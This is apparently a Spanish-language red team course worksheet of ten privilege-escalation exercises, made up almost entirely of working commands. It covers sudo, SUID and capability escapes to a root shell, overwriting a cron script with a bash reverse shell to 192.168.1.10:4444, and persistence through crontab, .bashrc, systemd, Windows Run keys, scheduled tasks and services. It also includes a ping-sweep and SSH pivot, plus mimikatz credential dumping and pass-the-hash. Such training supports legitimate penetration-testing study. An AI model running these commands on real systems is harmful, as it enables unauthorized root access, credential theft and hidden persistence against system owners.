# Red Team - Fase 3: Privilege Escalation Ejercicios

## Ejercicio 1: Linux Enumeration

### Objetivo
Enumerar sistema para escalar.

### Pasos
```bash
# Sistema
uname -a
cat /etc/lsb-release

# Usuario
id
whoami
sudo -l

# Procesos
ps aux | head -20

# Servicios
systemctl list-units --type=service --state=running

# Cronjobs
crontab -l
cat /etc/crontab

# Redes
ss -tulpn
ip a
```

### Entregable
Documento de enumeration.

---

## Ejercicio 2: sudo -l Exploits

### Objetivo
Explotar sudo mal configurado.

### Pasos
```bash
# Ver permisos sudo
sudo -l

# Si tiene vim
sudo vim -c '!sh'

# Si tiene less
sudo less /etc/passwd
!sh

# Si tiene awk
sudo awk 'BEGIN {system("/bin/sh")}'

# Si tiene find
sudo find . -exec /bin/sh \; -quit
```

### Entregable
Shell como root.

---

## Ejercicio 3: SUID Exploitation

### Objetivo
Explotar binarios SUID.

### Pasos
```bash
# Buscar SUID
find / -perm -4000 2>/dev/null

# Verificar
ls -la /bin/su

# Probar cada binario
/usr/bin/find . -exec /bin/sh \; -quit

# Probar otros
/usr/bin/nano /etc/passwd
```

### Entregable
Shell como root.

---

## Ejercicio 4: Cronjob Exploitation

### Objetivo
Explotar cronjobs inseguros.

### Pasos
```bash
# Ver cronjobs
cat /etc/crontab
ls -la /etc/cron.daily/

# Si hay script world-writable
ls -la /etc/cron.daily/backup.sh

# Agregar reverse shell
echo '#!/bin/bash' > /etc/cron.daily/backup.sh
echo 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1' >> /etc/cron.daily/backup.sh
chmod +x /etc/cron.daily/backup.sh
```

### Entregable
Reverse shell recibida.

---

## Ejercicio 5: Capabilities

### Objetivo
Explotar capabilities.

### Pasos
```bash
# Buscar capabilities
getcap -r / 2>/dev/null

# Si tiene python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Si tiene perl
/usr/bin/perl -e 'exec "/bin/sh"'
```

### Entregable
Shell como root.

---

## Ejercicio 6: Persistence Linux

### Objetivo
Implementar persistencia.

### Pasos
1. **Cronjob:**
   ```bash
   (crontab -l 2>/dev/null; echo "@reboot /tmp/shell") | crontab -
   ```
2. **.bashrc:**
   ```bash
   echo "/tmp/shell" >> ~/.bashrc
   ```
3. **systemd service:**
   ```bash
   cat > /etc/systemd/system/shell.service <<EOF
   [Unit]
   Description=Shell
   
   [Service]
   Type=simple
   ExecStart=/tmp/shell
   
   [Install]
   WantedBy=multi-user.target
   EOF
   ```

### Entregable
Múltiples métodos de persistencia.

---

## Ejercicio 7: Pivoting

### Objetivo
Moverse lateralmente en red.

### Pasos
```bash
# Ver red interna
ip route
cat /etc/hosts

# Escaneo interno
for ip in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$ip 2>/dev/null && echo "192.168.1.$ip up"; done

# SSH pivot
ssh -D 1080 usuario@192.168.1.77
```

### Entregable
Acceso a red interna.

---

## Ejercicio 8: mimikatz Basics

### Objetivo
Usar mimikatz en Windows.

### Pasos
```cmd
# Arrancar mimikatz
mimikatz.exe

# Privilegios
privilege::debug

# Dump passwords
sekurlsa::logonpasswords

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:WORKGROUP /ntlm:hash
```

### Entregable
Credenciales obtenidas.

---

## Ejercicio 9: Windows Persistence

### Objetivo
Persistir en Windows.

### Pasos
```cmd
# Registry Run
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Shell /t REG_SZ /d "C:\shell.exe"

# Scheduled Task
schtasks /create /tn "Shell" /tr C:\shell.exe /sc onlogon

# Service
sc create Shell binPath= C:\shell.exe
```

### Entregable
Múltiples puntos de persistencia.

---

## Ejercicio 10: HTB Machine Privesc

### Objetivo
Escalar en máquina HTB.

### Pasos
1. Conectar a HTB
2.Enumerar
3. Encontrar vector
4. Escalar
5. Documentar

### Entregable
Writeup completo.